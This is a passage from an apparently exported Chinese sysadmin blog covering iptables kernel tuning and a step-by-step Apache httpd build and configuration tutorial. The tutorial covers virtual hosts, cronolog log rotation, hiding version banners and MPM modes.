Nginx等服务器来说可以调低一点，如：改为5000-30000，不同业务的服务器也可以给大一点，比如LVS，squid\r以上几行的参数可以很好的减少TIME_WAIT套接字数量，但对于squid效果却不大。\rnet.ipv4.tcp_max_tw_buckets = 36000\rnet.ipv4.route.gc_timeout = 100\rnet.ipv4.tcp_syn_retries = 1\rnet.ipv4.tcp_synack_retries = 1\r# 以下参数是对iptables防火墙的优化，防火墙不会开提示，可以忽略不理。\rnet.nf_conntrack_max = 25000000\rnet.netfilter.nf_conntrack_max = 25000000\rnet.netfilter.nf_conntrack_tcp_timeout_established = 180\rnet.netfilter.nf_conntrack_tcp_timeout_time_wait = 120\rnet.netfilter.nf_conntrack_tcp_timeout_close_wait = 60\rnet.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120\rdmesg里面显示 ip_contrack:table full，``dropping packet.` 的错误提示，如何解决?\n这有两个可能，一个是打开的端口太少至不够用，修改ip_conntrack文件为1024 65535。\n还有一个原因是nat链接真的达到65535了。此时就把NAT映射表保持时间设置短一些。\n强调：如果并发比较大，或者日PV多的情况下，开启防火墙要注意，很可能导致网站访问缓慢。\n大并发（并发1万，PV日3000万）要么购买硬件防火墙，要么不开iptables防火墙。\n","permalink":"https://www.oomkill.com/2016/10/ch7-iptables-kernel-parameter/","summary":"","title":"ch7 关于iptables的内核参数"},{"content":"httpd下载地址：Historical releases\n安装httpd $ ls ABOUT_APACHE buildconf\temacs-style INSTALL\tLICENSE\tos\tsrclib acinclude.m4 CHANGES\thttpd.dep InstallBin.dsp Makefile.in README support Apache.dsw config.layout httpd.dsp LAYOUT Makefile.win README.platforms test build configure httpd.mak libhttpd.dep modules README-win32.txt VERSIONING BuildAll.dsp configure.in httpd.spec libhttpd.dsp NOTICE ROADMAP BuildBin.dsp docs include libhttpd.mak NWGNUmakefile server httpd 编译参数 参数选项 注释说明 ./configure 配置源代码树 –prefix=/usr/local/apache2 体系无关文件的顶级安装目录PREFIX，也就Apache的安装目录。 –enable-module=so [-enable-deflate] 打开so模块，so模块是用来提DSO支持的apache核心模块 –enable-deflate=shared [-enable-expires] 支持网页压缩 –enable-expires=shared [-enable-rewrite] 支持缓存过期控制 –enable-rewrite=shared 支持URL重写 –enable-cache 支持缓存 –enable-file-cache 支持文件缓存 –enable-mem-cache 支持记忆缓存 –enable-disk-cache 支持磁盘缓存 –enable-static-support 支持静态连接(默认为动态连接) –enable-static-htpasswd 使用静态连接编译htpasswd–管理用于基本认证的用户文件 –enable-static-htdigest 使用静态连接编译htdigest–管理用于摘要认证的用户文件 –enable-static-rotatelogs 使用静态连接编译rotatelogs–滚动Apache日志的管道日志程序 –enable-static-logresolve 使用静态连接编译logresolve–解析Apache日志中的IP地址为主机名 –enable-static-htdbm 使用静态连接编译htdbm–操作DBM密码数据库 –enable-static-ab 使用静态连接编译ab–Apache服务器性能测试工具 –enable-static-checkgid 使用静态连接编译checkgid –disable-cgid 禁止用一个外部CGI守护进程执行CGI脚本 –disable-cgi 禁止编译CGI版本的PHP –disable-userdir 禁止用户从自己的主目录中提供页面 –with-mpm=worker 让apache以worker方式运行 –enable-authn-dbm=shared 对动态数据库进行操作。Rewrite时需要。 以下是分门别类的更多参数注解，与上面的会有重复 用于apr的configure脚本的选项： 可选特性 \u0026ndash;enable-experimental-libtool 启用试验性质的自定义libtool \u0026ndash;disable-libtool-lock 取消锁定(可能导致并行编译崩溃) \u0026ndash;enable-debug 启用调试编译，仅供开发人员使用。 \u0026ndash;enable-maintainer-mode 打开调试和编译时警告，仅供开发人员使用。 \u0026ndash;enable-profile 打开编译profiling(GCC) \u0026ndash;enable-pool-debug[=yes|no|verbose|verbose-alloc|lifetime|owner|all] 打开pools调试 \u0026ndash;enable-malloc-debug 打开BeOS平台上的malloc_debug \u0026ndash;disable-lfs 在32-bit平台上禁用大文件支持(large file support) \u0026ndash;enable-nonportable-atomics 若只打算在486以上的CPU上运行Apache，那么使用该选项可以启用更加高效的基于互斥执行 的原子操作。 \u0026ndash;enable-threads 启用线程支持在线程型的MPM上必须打开它 \u0026ndash;disable-threads 禁用线程支持，如果不使用线程化的MPM，可以关闭它以减少系统开销。 \u0026ndash;disable-dso 禁用DSO支持 \u0026ndash;enable-other-child 启用可靠子进程支持 \u0026ndash;disable-ipv6 禁用IPv6支持 **可选的额外程序包** \u0026ndash;with-gnu-ld 指定C编译器使用GNU ld \u0026ndash;with-pic 只使PIC/non-PIC对象[默认为两者都使用] \u0026ndash;with-tags[=TAGS] 包含额外的配置 \u0026ndash;with-installbuilddir=DIR 指定APR编译文件的存放位置(默认值为：’${datadir}/build’) \u0026ndash;without-libtool 禁止使用libtool连接库文件 \u0026ndash;with-efence[=DIR] 指定Electric Fence的安装目录 \u0026ndash;with-sendfile 强制使用sendfile(译者注：Linux2.4/2.6内核都支持) \u0026ndash;with-egd[=DIR] 使用EDG兼容的socket \u0026ndash;with-devrandom[=DEV] 指定随机设备[默认为：/dev/random] 用于apr-util的configure脚本的选项 ： 可选的额外程序包 \u0026ndash;with-apr=PATH 指定APR的安装目录(–prefix选项值或apr-config的路径) \u0026ndash;with-ldap-include=PATH ldap包含文件目录(带结尾斜线) \u0026ndash;with-ldap-lib=PATH ldap库文件路径 \u0026ndash;with-ldap=library 使用的ldap库 \u0026ndash;with-dbm=DBM 选择使用的DBM类型DBM={sdbm,gdbm,ndbm,db,db1,db185,db2,db3,db4,db41,db42,db43,db44} \u0026ndash;with-gdbm=PATH 指定GDBM的位置 \u0026ndash;with-ndbm=PATH 指定NDBM的位置 \u0026ndash;with-berkeley-db=PATH 指定Berkeley DB的位置 \u0026ndash;with-pgsql=PATH 指定PostgreSQL的位置 \u0026ndash;with-mysql=PATH 参看INSTALL.MySQL文件的内容 \u0026ndash;with-sqlite3=PATH 指定sqlite3的位置 \u0026ndash;with-sqlite2=PATH 指定sqlite2的位置 \u0026ndash;with-expat=PATH 指定Expat的位置或builtin \u0026ndash;with-iconv=PATH iconv的安装目录 关于 2.2 编译参数\n./configure \\ --prefix=/app/apache2.4.28 \\ --enable-deflate \\ --enable-expires \\ --enable-headers \\ --enable-modules=most \\ --enable-so \\ --with-mpm=worker \\ --enable-rewrite 关于 2.4 编译参数\n./configure \\ --prefix=/app/apache-2.4.25.1 \\ --enable-so \\ --enable-deflate=shared \\ --enable-ssl=shared \\ --enable-expires=shared \\ --enable-headers=shared \\ --enable-rewrite=shared \\ --enable-static-support \\ --with-included-apr \\ --with-mpm=worker 开始安装httpd 先安装依赖包\nyum -y install \\ gcc \\ gcc-c++ \\ openssl-devel \\ zlib-devel \\ pcre-devel Troubleshooting configure: error: Bundled APR requested but not found configure: error: Bundled APR requested but not found at ./srclib/. Download and unpack the corresponding apr and apr-util packages to ./srclib/. 编译时需要下载 apr 和 apr-util 解压到 httpd/srclib/ 目录里 http://apr.apache.org/download\nerror: \u0026lsquo;PCRE_DUPNAMES\u0026rsquo; undeclared (first use in this function) 网上搜了下说是yum安装的pcre的版本太老了，不支持PCRE_DUPNAMES 和 PCRE_JAVASCRIPT_COMPAT 这样的PCRE特性。好吧，我去下个最新版的pcre来编译安装。\n解决方法：编译安装pcre后，我们重新对httpd-2.4.9执行编译,这下就不会继续报错.\nwget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.35.tar.gz tar zxf pcre-8.35.tar.gz \u0026amp;\u0026amp; cd pcre-8.35 ./configure make \u0026amp;\u0026amp; make install cannot restore segment prot after reloc: Permission denied 错误如下：\nhttpd: Syntax error on line 149 of /usr/local/apache/conf/httpd.conf: Cannot load modules/libphp5.so into server: /usr/local/apache/modules/libphp5.so: cannot restore segment prot after reloc: Permission denied 解决方法：很明显的selinux的权限问题\nchown -R apache:apache /usr/local/apache setenforce 0 chcon -c -v -R -u system_u -r object_r -t textrel_shlib_t /usr/local/apache/modules/libphp5.so configure: WARNING: OpenSSL version is too old 错误现象：CentOS 6.x\nchecking for OpenSSL version \u0026gt;= 0.9.8a... FAILED configure: WARNING: OpenSSL version is too old no checking whether to enable mod_ssl... configure: error: mod_ssl has been requested but can not be built due to prerequisite failures 解决方法：\nyum install openssl openssl-devel zlib location\u0026hellip; not found 错误现象：\nchecking for zlib location... not found checking whether to enable mod_deflate... configure: error: mod_deflate has been requested but can not be built due to prerequisite failures 解决方法\nyum install zlib zlib-devel -y no acceptable C compiler found in $PATH 错误现象：\nconfigure: error: no acceptable C compiler found in $PATH 解决方法：gcc工具没安装，或开发工具包没安装 [CentOS 6.x]\nyum groupinstall \u0026quot;Development tools\u0026quot; -y yum install gcc -y httpd: Could not reliably determine the server\u0026rsquo;s fully qualified domain name, 错误现象：\n$ ./bin/apachectl graceful httpd: apr_sockaddr_info_get() failed for web-lamp01 httpd: Could not reliably determine the server's fully qualified domain name, using 127.0.0.1 for ServerName 错误原因：找不到完整的 fqdn www.etiantian.com 为一个完整的 fqdn 使用 127.0.0.1 替代\n解决方法：在 httpd.conf 如果没有注册的DNS域名，用IP地址替换它\n启动参数 apachectl参数\n选项参数 注释说明 configtest 检查设置文件中的语法是否正确。 fullstatus 显示服务器完整的状态信息。 graceful 重新启动Apache服务器，但不会中断原有的连接。 help 显示帮助信息。 restart 重新启动Apache服务器。 start 启动Apache服务器。 status 显示服务器摘要的状态信息。 stop 停止Apache服务器。 httpd参数\n参数选项 注释说明 -c \u0026lt;httpd指令\u0026gt; 在读取配置文件前，先执行选项中的指令。 -C \u0026lt;httpd指令\u0026gt; 在读取配置文件后，再执行选项中的指令。 -d \u0026lt;服务器根目录\u0026gt; 指定服务器的根目录。 -D \u0026lt;设定文件参数\u0026gt; 指定要传入配置文件的参数。 -f \u0026lt;设定文件\u0026gt; 指定配置文件。 -h 显示帮助。 -l 显示服务器编译时所包含的模块。 -L 显示httpd指令的说明。 -S 显示配置文件中的设定。 -t 测试配置文件的语法是否正确。 -v 显示版本信息。 -V 显示版本信息以及建立环境。 -X 以单一程序的方式来启动服务器。 $ /app/apache/bin/apachectl start $ lsof -i:80 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME httpd 5871 root 4u IPv6 69297 0t0 TCP *:http (LISTEN) httpd 5873 daemon 4u IPv6 69297 0t0 TCP *:http (LISTEN) httpd 5874 daemon 4u IPv6 69297 0t0 TCP *:http (LISTEN) httpd 5875 daemon 4u IPv6 69297 0t0 TCP *:http (LISTEN) $ ps -ef|grep httpd root 5871 1 0 03:12 ? 00:00:00 /app/apache2.2.27/bin/httpd -k start daemon 5872 5871 0 03:12 ? 00:00:00 /app/apache2.2.27/bin/httpd -k start daemon 5873 5871 0 03:12 ? 00:00:00 /app/apache2.2.27/bin/httpd -k start daemon 5874 5871 0 03:12 ? 00:00:00 /app/apache2.2.27/bin/httpd -k start daemon 5875 5871 0 03:12 ? 00:00:00 /app/apache2.2.27/bin/httpd -k start root 5960 2056 0 03:12 pts/0 00:00:00 grep --color=auto httpd httpd目录结构 $ tree -L 1 . ├── bin #这是apache命令目录，如apache启动命令apachectl ├── ab #压力测试工具 同类软件还有jmeter loadrunner webench等 ├── apachectl #apache启动命令，需重点掌握，apachectl是一个脚本 ├── apxs # apxs是一个为Apache HTTP服务器编译和安装扩展模块的工具，在进行DOS当时编译模块时会用到 ├── htcacheclean #这是清理磁盘缓冲区的命令，需要在编译时指定相关参数才可以使用，一般很少用 ├── htpasswd # 建立和更新基本认证文件，如：配置nagios等监控服务时会用到 ├── httpd #httpd为apache的控制命令程序，apachectl执行时会调用httpd └── rotatelogs #apache自带的日志轮询命令，其他未使用过的略过未提级，以便大家学习主要的命令 ├── build ├── cgi-bin ├── conf # apache所有配置文件的目录 ├── extra # 额外的apache配置目录，这个目录里的文件我们会经常访问修改，如：httpd-vhosts.conf默认就在此目录 ├── httpd.conf #apache的主配置文件，这个文件我们会经常访问修改，其中的每一行的参数作用都应该闹明白 ├── magic ├── mime.types └── original ├── error ├── htdocs # 默认的apache的站点目录 ├── icons ├── include ├── lib ├── logs # 这个时apache的日志默认路径，包括错误日志及访问日志 ├── access_log #这是apache的默认访问日志 ├── cgisock.5871 ├── error_log # apache的错误日志 └── httpd.pid # httpd的pid文件，httpd进程启动后，会把所有的进程号ID写到此文件 ├── man ├── manual └── modules # apache模块的目录，如memcache httpd主配置文件说明 grep -Ev \u0026quot;#|^$\u0026quot; httpd.conf \u0026gt;httpd.conf.ori # 服务的根目录 软件安装到哪 ServerRoot \u0026quot;/app/apache2.2.27\u0026quot; # web服务监听的端口 监听的ip默认为本机的所有ip地址 listen可以为多个，也可以指定ip # 没有listen端口是开启不了的 Listen 80 Listen 8000 Listen 192.168.59.1:90 # 如不加默认为所有 \u0026lt;IfModule !mpm_netware_module\u0026gt; \u0026lt;IfModule !mpm_winnt_module\u0026gt; User daemon # 编译安装软件默认用户是daemon 用户 Group daemon #组 \u0026lt;/IfModule\u0026gt; \u0026lt;/IfModule\u0026gt; #管理员的邮箱 当前网站出问题了，会在页面显示 ServerAdmin you@example.com # 默认的站点目录 DocumentRoot \u0026quot;/app/apache2.2.27/htdocs\u0026quot; # 权限控制 表示根目录拒绝其他人访问 \u0026lt;Directory /\u0026gt; Options FollowSymLinks #带符号连接 AllowOverride None #禁止相关的功能 如.htaccess Order deny,allow #不让任何人访问这个目录 Deny from all \u0026lt;/Directory\u0026gt; # 如果新增加一个站点目录必须增加这6行，否则网站打不开 \u0026lt;Directory \u0026quot;/app/apache2.2.27/htdocs\u0026quot;\u0026gt; Options Indexes FollowSymLinks #Indexs 没有index展示所有目录 AllowOverride None Order allow,deny Allow from all \u0026lt;/Directory\u0026gt; # 指定访问的首页 如果有多个用空格分开 \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; \u0026lt;FilesMatch \u0026quot;^\\.ht\u0026quot;\u0026gt; Order allow,deny Deny from all Satisfy All \u0026lt;/FilesMatch\u0026gt; #错误日志 ErrorLog \u0026quot;logs/error_log\u0026quot; #日志级别 警告 LogLevel warn #访问日志的类型 \u0026lt;IfModule log_config_module\u0026gt; LogFormat \u0026quot;%h %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b \\\u0026quot;%{Referer}i\\\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot;\u0026quot; combined LogFormat \u0026quot;%h %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b\u0026quot; common \u0026lt;IfModule logio_module\u0026gt; LogFormat \u0026quot;%h %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b \\\u0026quot;%{Referer}i\\\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot; %I %O\u0026quot; combinedio \u0026lt;/IfModule\u0026gt; CustomLog \u0026quot;logs/access_log\u0026quot; common \u0026lt;/IfModule\u0026gt; # cgi的配置 现在已经过时了，工作中应该删掉 \u0026lt;IfModule alias_module\u0026gt; ScriptAlias /cgi-bin/ \u0026quot;/app/apache2.2.27/cgi-bin/\u0026quot; \u0026lt;/IfModule\u0026gt; \u0026lt;IfModule cgid_module\u0026gt; \u0026lt;/IfModule\u0026gt; \u0026lt;Directory \u0026quot;/app/apache2.2.27/cgi-bin\u0026quot;\u0026gt; AllowOverride None Options None Order allow,deny Allow from all \u0026lt;/Directory\u0026gt; # 缺省的类型 DefaultType text/plain #添加的类型，对什么类型做什么控制 \u0026lt;IfModule mime_module\u0026gt; TypesConfig conf/mime.types AddType application/x-compress .Z AddType application/x-gzip .gz .tgz \u0026lt;/IfModule\u0026gt; \u0026lt;IfModule ssl_module\u0026gt; SSLRandomSeed startup builtin SSLRandomSeed connect builtin \u0026lt;/IfModule\u0026gt; httpd的扩展配置文件 $ ll 总用量 56 -rw-r--r--. 1 root root 2843 4月 8 03:03 httpd-autoindex.conf -rw-r--r--. 1 root root 1713 4月 8 03:03 httpd-dav.conf -rw-r--r--. 1 root root 2344 4月 8 03:03 httpd-default.conf -rw-r--r--. 1 root root 1103 4月 8 03:03 httpd-info.conf -rw-r--r--. 1 root root 5078 4月 8 03:03 httpd-languages.conf -rw-r--r--. 1 root root 933 4月 8 03:03 httpd-manual.conf -rw-r--r--. 1 root root 3789 4月 8 03:03 httpd-mpm.conf -rw-r--r--. 1 root root 2183 4月 8 03:03 httpd-multilang-errordoc.conf -rw-r--r--. 1 root root 11378 4月 8 03:03 httpd-ssl.conf -rw-r--r--. 1 root root 817 4月 8 03:03 httpd-userdir.conf -rw-r--r--. 1 root root 1491 4月 8 03:03 httpd-vhosts.conf mpm\n--with-mpm=worker \\ \u0026lt;IfModule mpm_prefork_module\u0026gt; StartServers 5 MinSpareServers 5 MaxSpareServers 10 MaxClients 150 MaxRequestsPerChild 0 \u0026lt;/IfModule\u0026gt; # 如果指定了worker就是woker，否则是prefork \u0026lt;IfModule mpm_worker_module\u0026gt; StartServers 2 MaxClients 150 MinSpareThreads 25 MaxSpareThreads 75 ThreadsPerChild 25 MaxRequestsPerChild 0 \u0026lt;/IfModule\u0026gt; defalut配置文件\n$ grep -Ev \u0026quot;#|^$\u0026quot; httpd-default.conf # 连接超时 Timeout 300 #保持连接的状态 KeepAlive On #最大接受多少个永久连接 MaxKeepAliveRequests 100 #在同一个连接上，等待下一个请求的时间 KeepAliveTimeout 5 UseCanonicalName Off #将伪静态的语法写在这个里面 AccessFileName .htaccess #隐藏apache版本号，不同意被攻击 ServerTokens Full ServerSignature On HostnameLookups Off 虚拟主机 所谓基于 ”x“ 的虚拟主机，就是靠 ”x“ 来区分不同的站点。支持各种混合，N多个虚拟主机\n基于域名的虚拟主机★★★★★ 建立三个站点\nwww.etiantian.com\t\u0026mdash;\u0026mdash; /var/html/www blog.etiantian.com \u0026mdash;\u0026mdash; /var/html/blog bbs.etiantian.com \u0026mdash;\u0026mdash; /var/html/bbs 步骤1：在 httpd.conf 中打开 Include conf/extra/httpd-vhosts.conf\n步骤2：在 extra 中的 vhost 中添加三个虚拟主机\n\u0026lt;VirtualHost *:80\u0026gt; ServerAdmin test.com@gmail.com DocumentRoot \u0026quot;/var/html/www\u0026quot; ServerName www.etiantian.com ErrorLog \u0026quot;logs/www_error_log\u0026quot; CustomLog \u0026quot;logs/www_access_log\u0026quot; common \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; ServerAdmin test.com@gmail.com DocumentRoot \u0026quot;/var/html/blog\u0026quot; ServerName blog.etiantian.com ErrorLog \u0026quot;logs/blog_error_log\u0026quot; CustomLog \u0026quot;logs/blog_access_log\u0026quot; common \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; ServerAdmin test.com@gmail.com DocumentRoot \u0026quot;/var/html/bbs\u0026quot; ServerName bbs.etiantian.com ErrorLog \u0026quot;logs/bbs_error_log\u0026quot; CustomLog \u0026quot;logs/bbs_access_log\u0026quot; common \u0026lt;/VirtualHost\u0026gt; 步骤3：在主配置文件，或在 \u0026lt;VirtualHost\u0026gt; 里配置权限\n\u0026lt;Directory \u0026quot;/var/html\u0026quot;\u0026gt; Options FollowSymLinks AllowOverride None Order allow,deny Allow from all \u0026lt;/Directory\u0026gt; 如果配置为 Options Indexes FollowSymLinks 则显示为下图所示\n如果配置为 Options -Indexes FollowSymLinks 则显示为下图所示\n基于端口的虚拟主机 一般来讲是内部网站\n优点：安全一些，别人找不到 步骤1：在 httpd.conf 中增加监听端口\nListen 80 Listen 8000 Listen 9000 步骤1：在 vhost 文件中增加\nNameVirtualHost *:80 NameVirtualHost *:8000 \u0026lt;VirtualHost *:8000\u0026gt; 基于IP的虚拟主机 步骤1：配置别名ip\nifconfig eth0:0 192.168.59.140/24 步骤2：1.修改 vhost 文件虚拟主机配置\n\u0026lt;VirtualHost 192.168.59.140:80\u0026gt; ServerAdmin test.com@gmail.com DocumentRoot \u0026quot;/var/html/blog\u0026quot; ServerName 192.168.59.140 ErrorLog \u0026quot;logs/blog_error_log\u0026quot; CustomLog \u0026quot;logs/blog_access_log\u0026quot; common \u0026lt;/VirtualHost\u0026gt; 混合虚拟主机 \u0026lt;VirtualHost 192.168.59.140:900\u0026gt; ServerAdmin test.com@gmail.com DocumentRoot \u0026quot;/var/html/blog\u0026quot; ServerName 192.168.59.140 ErrorLog \u0026quot;logs/blog_error_log\u0026quot; CustomLog \u0026quot;logs/blog_access_log\u0026quot; common \u0026lt;/VirtualHost\u0026gt; 日志格式 通用日志格式Common Log Format 组合日志格式Combinded Log Format LogFormat \u0026quot;%h %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b \\\u0026quot;%{Referer}i\\\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot;\u0026quot; combined LogFormat \u0026quot;%h %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b\u0026quot; common 如何使用combined或common呢？\n答：在虚拟主机配置中更改格式\n\u0026lt;VirtualHost *:80\u0026gt; ServerAdmin test.com@gmail.com DocumentRoot \u0026quot;/var/html/www\u0026quot; ServerName www.etiantian.com ErrorLog \u0026quot;logs/www_error_log\u0026quot; CustomLog \u0026quot;logs/www_access_log\u0026quot; common/combind \u0026lt;/VirtualHost\u0026gt; 日志轮询 rotatelog cronolog ☆☆☆ 安装 cronolog\n./configure make make install $ which cronolog /usr/local/sbin/cronolog 如果用cronolog轮询的的话最好用全路径\nCustomLog \u0026quot;|/usr/local/sbin/cronolog /app/logs/access_bbs_%Y%m%d.log\u0026quot; combined $ mkdir /app/logs -p $ ../bin/apachectl graceful 日志轮询除了可以使用年月日还可以使用周\nCustomLog \u0026quot;|/usr/local/sbin/cronolog /app/logs/access_bbs_%w.log\u0026quot; combined 时间格式串：\n时间格式串 %H 24小时制小时(00..23) %I 12小时制小时(01..12) %p 本地AM/PM指示符 %M 分钟(00..59) %S 秒(00..61) %X 本地时间(e.g.:“15:12:47″) %Z 时区(e.g.GMT)，如果不能检测出时区，值为空 日期格式串 %a 本地简短星期名(e.g.: Sun..Sat) %A 本地完整星期名(e.g.: Sunday .. Saturday) %b 本地简短月名(e.g.: Jan .. Dec) %B 本地完整月名(e.g.: January .. December) %c 本地日期与时间(e.g.: “Sun Dec 15 14:12:47 GMT 1996″) %d 一月中的第几日(01 .. 31) %j 一年中的第几天 (001 .. 366) %m 月名的数字表示 (01 .. 12) %U 一年中以星期日为每周第一天计算的星期数(00..53, 第一周包括新年的第一个星期日) %W 一年中以星期一为每周第一天计算的星期数(00..53, 第一周包括新年的第一个星期一) %w 星期名的数字表示 (0 .. 6, 0为星期日) %x 本地日期 (e.g. 今天在北京是: “15/12/96″) %y 不带世纪的年(00 .. 99) %Y 带世纪的年(1970 .. 2038) 错误写法：\n提示：cronolog轮询日志的正确写法，被轮询的日志路径要写全路径\n按天轮询（生产环境常见用法，推荐使用）\n# 错误写法 CustomLog \u0026quot;|usr/local/sbin/cronolog logs/access_www_%w.log\u0026quot; combined # 正确写法 CustomLog \u0026quot;|usr/local/sbin/cronolog /app/logs/access_www_%Y%m%d.log\u0026quot; combined 提示：这是大多数网站的常规配置方法（按天记录日志，日志不会自动覆盖）\n按小时轮询（生产环境较常见用法）：\n# 按小时轮询（生产环境较常见用法） CustomLog \u0026quot;|usr/local/sbin/cronolog /app/logs/access_www_%Y%m%d%H.log\u0026quot; combined # 按天轮询（生产环境较常见用法） CustomLog \u0026quot;|usr/local/sbin/cronolog /app/logs/access_www_%Y%m%d.log\u0026quot; combined 完整配置如下\n\u0026lt;VirtualHost *:80\u0026gt; ServerAdmin test.com@gmail.com DocumentRoot \u0026quot;/var/html/blog\u0026quot; ServerName blog.etiantian.com ErrorLog \u0026quot;logs/blog_error_log\u0026quot; CustomLog \u0026quot;|/usr/local/sbin/cronolog /app/logs/access_blog_%w.log\u0026quot; combined \u0026lt;/VirtualHost\u0026gt; 配置定时任务\n# 创建脚本目录 mkdir /server/script/web/ -p # 创建脚本文件 touch /server/script/web/apache_log.sh # 编辑脚本内容 cd /app/apache/logs mv www_access_log /app/logs/www_access_$(date +%F -d '-1day').log www_access_log \u0026gt;www_access_log /app/apache/bin/apachectl graceful # 添加定时任务 00 00 * * * /bin/sh /server/script/web/apache_log.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 # 测试脚本是否可执行成功 # 如果脚本没有执行权限 $ /server/script/web/apache_log.sh -bash: /server/script/web/apache_log.sh: 权限不够 $ /bin/sh /server/script/web/apache_log.sh # 查看执行结果 $ ll 总用量 0 # 将时间设置为0时 $ date -s '2017-04-20 23:59:00' # 这时候时23:59查看当天日志是有内容的，并且/app/logs/下面没有文件 $ cat /app/apache/logs/www_access_log 192.168.59.1 - - [20/Apr/2017:23:59:19 +0800] \u0026quot;GET / HTTP/1.1\u0026quot; 304 - \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0\u0026quot; # 0时这个时候发现目录生成新日志文件了 $ ll 总用量 4 -rw-r--r--. 1 root root 153 4月 20 23:59 www_access_2017-04-21.log 不记录日志 正如下列配置所示\n\u0026lt;FilesMatch '\\. (css|js|gif|jpg|ico|swf|png)'\u0026gt; SetEnv IMAG 1 \u0026lt;/FilesMatch\u0026gt; 实际日志配置\nCustomLog \u0026quot;|/usr/local/sbin/cronolog /app/logs/access_bbs_%w.log\u0026quot; combined evn=!IMAG 查询日志\nawk '{print $1}' www-access_2014-09-18log |sort|uniq -c|sort -rn -k1|head -10 隐藏httpd版本号 步骤1：编译前隐藏版本信息\ncat /home/tools/httpd-2.2.27/include/ap_release.h 找到 #define AP_SERVER_BASEPRODUCT \u0026quot;Apache\u0026quot;\n#define AP_SERVER_BASEPRODUCT \u0026quot;Apache\u0026quot; # 修改为 #define AP_SERVER_BASEPRODUCT \u0026quot;Microsoft-IIS/5.0\u0026quot; #define AP_SERVER_BASEVENDOR \u0026quot;Apache Software Foundation\u0026quot; #define AP_SERVER_BASEPROJECT \u0026quot;Apache HTTP Server\u0026quot; #define AP_SERVER_BASEPRODUCT \u0026quot;Apache\u0026quot; #define AP_SERVER_MAJORVERSION_NUMBER 2 #define AP_SERVER_MINORVERSION_NUMBER 2 #define AP_SERVER_PATCHLEVEL_NUMBER 27 #define AP_SERVER_DEVBUILD_BOOLEAN 0 找到 cat /home/tools/httpd-2.2.27/os/unix/os.h，修改 #define PLATFORM \u0026quot;Unix\u0026quot; 修改为 #define PLATFORM \u0026quot;Win32\u0026quot; **步骤3：最后修改 /etc/httpd/conf/httpd.conf **\nServerTokens Prod # Prod 同 ProductOnly ServerSignature Off 配置前的响应头\n$ curl 127.0.0.1 -I HTTP/1.1 200 OK Date: Thu, 20 Apr 2017 16:18:24 GMT Server: Apache/2.2.27 (Unix) DAV/2 配置如下参数\nvi /app/apache/conf/extra/httpd-default.conf ServerTokens Prod ServerSignature Off 配置后的响应头\n$ curl 127.0.0.1 -I HTTP/1.1 200 OK Date: Thu, 20 Apr 2017 16:22:19 GMT Server: Apache 附：\nServerSignature 三个选项，分别是 On | Off | EMail ServerTokens 的取值如下，其分别隐藏信息依次增加，推荐： ServerTokens ProductOnly 未经修改的请求头如下\n$ curl –head 127.0.0.1 HTTP/1.1 200 OK Date: Thu, 22 Jan 2015 15:39:00 GMT Server: Apache/2.2.26 (CentOS) X-Powered-By: PHP/5.5.9 Vary: Cookie,Accept-Encoding,User-Agent X-Pingback: http://blog.mimvp.com/xmlrpc.php Cache-Control: max-age=600 Expires: Thu, 22 Jan 2015 15:49:00 GMT Content-Type: text/html; charset=UTF-8 上面头信息中，会显示服务器类型和版本(Apache/2.2.26)，以及操作系统(CentOS)\n修改 ServerTokens\n修改 ServerTokens OS 为 ServerTokens productonly\n再次返回头信息如下：\n$ curl –head 127.0.0.1 HTTP/1.1 200 OK Date: Thu, 22 Jan 2015 15:40:53 GMT Server: Apache X-Powered-By: PHP/5.5.9 Vary: Cookie,Accept-Encoding,User-Agent X-Pingback: http://blog.mimvp.com/xmlrpc.php Cache-Control: max-age=600 Expires: Thu, 22 Jan 2015 15:50:53 GMT Content-Type: text/html; charset=UTF-8 隐藏php版本号 php.ini\nexpose_php On 改成 expose_php Off\nHTTP fastcgi模式启动 编译PHP时候不要使用aspx\n注释掉以下，fpm安装方式。不用管，例如下面配置\nLoadModule php5_module modules/libphp5.so \u0026lt;FilesMatch \\.php$\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 然后去掉 mod_proxy.so 和 mod_proxy_fcgi.so 之前的注解，确保他们被apache加载。\n如果php-fpm使用的是TCP socket，那么在httpd.conf末尾加上：\n\u0026lt;FilesMatch \\.php$\u0026gt; 正则匹配文件，如果文件名为.php结尾 SetHandler \u0026quot;proxy:fcgi://127.0.0.1:9000\u0026quot; \u0026lt;/FilesMatch\u0026gt; httpd的工作模式 worker/perfor模式 在linux中，我们可以使用 http-l 查看安装的模块是 prefork 模式还是 worker 模式\n$ /app/apache/bin/apachectl -l|sed -n '/worker\\|prefork/p' prefork.c\t#\u0026lt;== 默认为prefork（预派生）模式5个进程 482 Include conf/extra/httpd-mpm.conf #\u0026lt;==在httpd.conf中打开mpm配置文件. prefork模式 prefork使用的是多个子进程，而每个子进程只有一个线程，每个进程在某个确定的时间只能维持一个连接.\n工作原理 控制进程最初简历若干个子进程，为了不在请求到来时再生成子进程，所以要根据需求不断的创建新的子进程，最大可以达到每秒32个知道满足需求为止.\n安装方法：在编译的过程中，加入参数 --with-mpm=prefork 如果不加也可以，因为默认的话，会采用 prefork模式。\n优点：效率高，稳定，安全。对于线程调试困难的平台来说，调试更加容易些. 缺点：和work模式比消耗资源多. prefork配置参数说明 # prefork MPM # StartServers: number of server processes to start # MinSpareServers: minimum number of server processes which are kept spare # MaxSpareServers: maximum number of server processes which are kept spare # MaxRequestWorkers: maximum number of server processes allowed to 